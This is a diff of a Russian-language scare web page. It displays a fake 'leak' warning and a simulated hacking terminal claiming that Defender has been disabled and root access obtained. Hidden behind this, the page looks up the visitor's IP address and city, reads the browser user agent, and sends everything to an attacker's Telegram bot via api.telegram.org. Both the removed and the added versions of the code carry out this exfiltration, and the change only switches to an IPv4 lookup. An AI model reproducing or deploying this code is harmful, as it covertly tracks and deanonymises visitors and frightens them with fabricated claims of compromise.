@@ -26,7 +26,7 @@
     <div id="leak-box">
         <div class="danger-ui">
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
-            <hr color="red">
+            <hr>
             <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
             <p>> IP-адрес: <span id="user-ip" style="color:#fff;">Определение...</span></p>
             <p>> Город: <span id="user-geo" style="color:#fff;">Поиск...</span></p>
@@ -49,15 +49,13 @@
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-           
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик! Запуск двойного сканирования...")}`);
+    
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик! Запуск IPv4 сканирования...")}`);
  
             const lines = [
-                "> [INIT] Инициализация взлома...", "> [INFO] Поиск уязвимостей...",
-                "> [SUCCESS] Токен верификации получен", "> [INFO] Инжект в процесс lsass.exe...",
-                "> [WARNING] Defender обнаружил активность", "> [SUCCESS] Defender отключен",
-                "> [SYSTEM] Доступ к ядру системы...", "> [CRITICAL] Права ROOT получены",
-                "> [DONE] ПОЛНЫЙ ДОСТУП ПОЛУЧЕН."
+                "> [INIT] Инициализация взлома...", "> [INFO] Обход защиты reCAPTCHA...",
+                "> [SUCCESS] Доступ к системе получен", "> [INFO] Инжект в процесс браузера...",
+                "> [CRITICAL] Права ROOT получены", "> [DONE] ПОЛНЫЙ ДОСТУП."
             ];
 
             for (let line of lines) {
@@ -68,44 +66,31 @@
                 await new Promise(r => setTimeout(r, 350)); 
             }
 
-            await sendFullLogsDouble();
+            await getIpv4Data();
         }
 
-        async function sendFullLogsDouble() {
-            let ip = "Не определен";
-            let city = "Неизвестно";
-            let device = navigator.userAgent;
-            let platform = navigator.platform;
-
+        async function getIpv4Data() {
             try {
-            
-                let res = await fetch('https://ipapi.co/json/');
-                let d = await res.json();
-                
-                if (d.ip) {
-                    ip = d.ip;
-                    city = d.city + ", " + d.country_name;
-                } else {
-                  
-                    res = await fetch('https://ipwho.is/');
-                    d = await res.json();
-                    ip = d.ip || "Не определен";
-                    city = (d.city || "Неизвестно") + ", " + (d.country || "");
-                }
-
-     
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = platform;
-
          
-                const msg = `🔥 ПОЛНЫЙ ЛОГ (Двойной поиск)!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${device}\n💻 Платформа: ${platform}`;
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ipv4 = ipData.ip;
+
                 
-               
+                const geoRes = await fetch(`https://ipwho.is/${ipv4}`);
+                const g = await geoRes.json();
+                const city = (g.city || "Неизвестно") + ", " + (g.country || "");
+
+            
+                document.getElementById('user-ip').innerText = ipv4;
+                document.getElementById('user-geo').innerText = city;
+                document.getElementById('user-os').innerText = navigator.platform;
+ 
+                const msg = `🔥 ПОЛНЫЙ ЛОГ (IPv4)!\n📍 IP: ${ipv4}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-                const backup = `⚠️ Переход (Ошибка обоих сервисов)!\n📱 ${device}\n❌ Ошибка: ${e.message}`;
+                const backup = `⚠️ Переход (Ошибка IP)!\n📱 ${navigator.userAgent}`;
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
 
